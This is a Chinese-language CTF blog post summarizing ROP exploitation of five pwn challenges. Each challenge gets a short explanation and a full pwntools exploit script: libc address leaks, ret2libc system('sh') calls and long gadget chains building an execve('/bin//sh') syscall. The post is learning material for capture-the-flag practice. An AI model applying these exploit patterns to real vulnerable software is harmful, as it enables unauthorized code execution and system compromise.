---
title: Easy_ROP points 
date: 2020-02-20
tags:
    - ROP
categories:
    - Pwn
keywords: 
    - 基础ROP
description: 
    - CTF 
toc: true
---
作者：LordRiot
#### 2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point: )
<br>
这篇中出现的题均是ichunqiu中Linux Pwn基础ROP中的题目，题目中的exp可能有些libc环境问题，
具体地址数值不能直接代入，但思路均可参考:-(其实是我本地莫名加载不了题给libc 2333)

### TU CTF 2016-especially good jmps

这个题一开始有些困扰我的点在于scanf读入数字之后没有清空缓冲区，
如果直接sendline('1')这样，那么缓冲区的'\n'就会将下个gets截断，
于是想到在'1'后面加一个字母来截断scanf对整数的读取，相当于payload开头的第一个字符
之后的padding记得相应少一个字符即可，exp如下

```
p = process('especially_good_jmps')
puts_got = 0x0804A018
puts_plt = 0x080483E0
main_addr = 0x08048420
sh_addr = 0x08048293

payload = "\x00" * 0x2C
payload += p32(puts_plt)
payload += p32(main_addr)
payload += p32(puts_got)

p.recvuntil('name?\n')
p.sendline(payload)
p.recvuntil('number?\n')
p.send('1l')            #cut off the scanf() reading

p.recvuntil('odd number!\n')
puts_addr = u32(p.recv(4))
print(hex(puts_addr))

obj = LibcSearcher("puts", puts_addr)
base_addr = puts_addr - obj.dump("puts")
sys_addr = base_addr + obj.dump("system")

payload = "a" * 0x2b    #because of the 'l' hence here is 0x2c - 1 = 0x2b
payload += p32(sys_addr)
payload += p32(main_addr)
payload += p32(sh_addr)

p.recvuntil('name?\n')
p.sendline(payload)
p.recvuntil('number?\n')
p.sendline('1')

p.interactive()
```

### Alictf 2016-vss

emmmmmm，算是我做过的第一个静态编译的题，一开始放到IDA里我直接懵了，800多个函数，我还以为是个逆向题，后来查了点相关资料，才知道是个静态编译题，即将libc中的函数直接放到程序里。然后就是函数认证的问题，因为反汇编是一堆sub_xxxxx，emmmmm一个一个看还是比较费劲的，需要从给IDA引入libc.sig文件，将[sig数据库](https://github.com/push0ebp/sig-database)的sig文件导入IDA下的"/lscan/lscan/i386/sig"，然后在IDA中使用shift + F5即可应用，但是匹配度有多有少，这个题我最终用三个sig文件匹配到了400多个函数，我试了用github上一个lscan的工具，但是并不好用，匹配率4000+%就离谱，所以目前可能还是只能自己手动添加，不过有一些主要函数大致就够了，这题本身主要是利用抬栈执行ropchain即可，具体原理其实自己想下函数调用很好明白。

```
p = process('vss')

add_rsp = 0x46f2f1

payload = 'py'

payload = payload.ljust(0x48, 'a')
payload += p64(add_rsp)
payload = payload.ljust(0x78, 'a') #to get the rop addr

# the ropchain from ROPgadget:
payload += pack('<Q', 0x0000000000401937) # pop rsi ; ret
payload += pack('<Q', 0x00000000006c4080) # @ .data
payload += pack('<Q', 0x000000000046f208) # pop rax ; ret
payload += '/bin//sh'
payload += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000401937) # pop rsi ; ret
payload += pack('<Q', 0x00000000006c4088) # @ .data + 8
payload += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000401823) # pop rdi ; ret
payload += pack('<Q', 0x00000000006c4080) # @ .data
payload += pack('<Q', 0x0000000000401937) # pop rsi ; ret
payload += pack('<Q', 0x00000000006c4088) # @ .data + 8
payload += pack('<Q', 0x000000000043ae05) # pop rdx ; ret
payload += pack('<Q', 0x00000000006c4088) # @ .data + 8
payload += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004004b8) # syscall

p.recvuntil('Password')
p.sendline(payload)
p.interactive()
```

### BackdoorCTF 2017-just do it

这个题我也是遇到了和之前especially_good_jmps一样的困扰，缓冲区没有清空，无法利用read函数将'sh'读到指定data段，后来想到再leak出地址后可以利用fflsh函数清空一次缓冲区，然后再读入'sh'即可。


```
p = process('32_chal')

pop_esi = 0x0804853d
main_addr = 0x0804847D
got = 0x0804A00C
write_plt = 0x08048370
data_addr = 0x0804A020
read_plt = 0x08048330


payload = 'a' * 0x70
payload += p32(write_plt)
payload += p32(main_addr)
payload += p32(1)
payload += p32(got)
payload += p32(4)

p.recvuntil('Hello pwners, \n')
p.sendline(payload)

function = 'read'
da = u32(p.recvuntil('H')[1:5])
addr = da
base_addr = addr - libc32.sym[function]
sys_addr = base_addr + libc32.sym['system']
gets_addr = base_addr + libc32.sym['gets']
fflush_addr = base_addr + libc32.sym['fflush']
print(hex(base_addr))
print(hex(sys_addr))

payload = 'a' * 0x68
payload += p32(fflush_addr)  #use the fflush to make the read function works
payload += p32(main_addr)
payload += p32(0)

p.recvuntil('pwners, \n')
p.sendline(payload)

payload = 'a' * 0x70
payload += p32(read_plt)
payload += p32(main_addr)
payload += p32(0)
payload += p32(data_addr)
payload += p32(5)

p.recvuntil('pwners, \n')
p.sendline(payload)
sleep(1)
p.sendline('sh')

payload = 'a' * 0x68
payload += p32(sys_addr)
payload += p32(main_addr)
payload += p32(data_addr)

p.recvuntil('pwners, \n')
p.sendline(payload)

p.interactive()
```


### boston key party 2016-simple calc
这题其实本身挺简单，也是个静态编译，不过输入需要判断，简单写个判断函数就行，只是一开始懒得自己码代码，想去看看别的dalao怎么做，结果看有的exp一个一个字节手动构造，给我看傻了，遂还是自己写了2333，注意四个字节一个数字，分情况用加，减，乘三种拆分即可

```
p = process('simple_calc')


def SEND(number, A1, A2):
    p.recvuntil('=> ')
    p.sendline(str(number))
    p.recvuntil('Integer x:')
    p.sendline(str(A1))
    p.recvuntil('Integer y:')
    p.sendline(str(A2))


def get_factor(number):
    for i in range(40, (int)(math.sqrt(number))):
        if number % i == 0:
            return i, number/i
    return 0, 0


payload = '0' * 0x30
payload += p64(0)                         # the parameter of free would be covered by this
payload = payload.ljust(0x48, "\x00")     # let the program conntinue, use the null

payload += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
payload += pack('<Q', 0x00000000006c1060) # @ .data
payload += pack('<Q', 0x000000000044db34) # pop rax ; ret
payload += '/bin//sh'
payload += pack('<Q', 0x0000000000470f11) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
payload += pack('<Q', 0x00000000006c1068) # @ .data + 8
payload += pack('<Q', 0x000000000041c61f) # xor rax, rax ; ret
payload += pack('<Q', 0x0000000000470f11) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000401b73) # pop rdi ; ret
payload += pack('<Q', 0x00000000006c1060) # @ .data
payload += pack('<Q', 0x0000000000401c87) # pop rsi ; ret
payload += pack('<Q', 0x00000000006c1068) # @ .data + 8
payload += pack('<Q', 0x0000000000437a85) # pop rdx ; ret
payload += pack('<Q', 0x00000000006c1068) # @ .data + 8
payload += pack('<Q', 0x000000000041c61f) # xor rax, rax ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000463b90) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000400488) # syscall

len = len(payload)

p.recvuntil('calculations:')
p.sendline(str(len/4 + 1))

for i in range(len/4):                    # make the ropchain works
    x = u32(payload[i * 4: (i+1) * 4])
    if x > 80 and x < 2 ** 31:
        if x % 2 == 0:
            a1 = x/2
            a2 = x/2
        else:
            a1 = (x+1)/2
            a2 = (x-1)/2
        SEND(1, a1, a2)
    elif x < 80:
        a1 = x + 0x28
        a2 = 0x28
        SEND(2, a1, a2)
    else:
        a1, a2 = get_factor(x)
        SEND(3, a1, a2)

p.recvuntil('=> ')
#pause()
p.sendline('5')
p.interactive()
```


###  Seccon CTF 2016-cheer msg

这个题属实恶心了我好久，一开始找不到洞怎么用，我傻傻的一直没有点开alloca函数，天真的以为那是个库函数，结果后来发现这就是个sub esp, eax， 然后就想到了用负数来让message函数的栈和主函数重合，来溢出，注意的是这里的canary就是个摆设，只有message函数有，主函数没有。
然而这只是恶心的开始，然后我就看着message函数的开始是sub esp, 0x68，就想着本身会抬高0x68，一直用这个数据算，结果怎么都拿不到shell，后来看了别的dalao写的exp，自己好好动调了一下，发现总共会抬升0x70，果然凡事别太自信，不行就动调。。。


```

p = process('cheer_msg')

main_addr = 0x080485CA
printf_plt = 0x08048430
printf_got = 0x0804A010
format_addr = 0x08048888
data_addr = 0x0804A030

length = -0x70                              # the real offset should debug by yourself

p.recvuntil('Length >> ')
p.sendline(str(length))

payload = 'a' * 32
payload += p32(printf_plt)
payload += p32(main_addr)
payload += p32(printf_got)
payload += p32(format_addr)

p.recvuntil('Name >> ')
p.sendline(payload)

p.recvuntil('Message :')
printf_addr = u32(p.recvuntil('Hello')[2: 6])
base_addr = printf_addr - libc32.sym['printf']
gets_addr = base_addr + libc32.sym['gets']
sys_addr = base_addr + libc32.sym['system']

p.recvuntil('Length >> ')
p.sendline(str(length))

payload = 'a' * 32
payload += p32(gets_addr)
payload += p32(main_addr)
payload += p32(data_addr)

p.recvuntil('Name >> ')
p.sendline(payload)

p.sendline('sh')

payload = 'a' * 32
payload += p32(sys_addr)
payload += p32(main_addr)
payload += p32(data_addr)

p.recvuntil('Length >> ')
p.sendline(str(length))

p.recvuntil('Name >> ')
p.sendline(payload)

p.interactive()
```

大概就先写这些吧，最近刚开学，课内压力还不大，趁这个机会好好补补pwn，然而估计TSCTF还是会划水2333，保研要紧保研要紧~
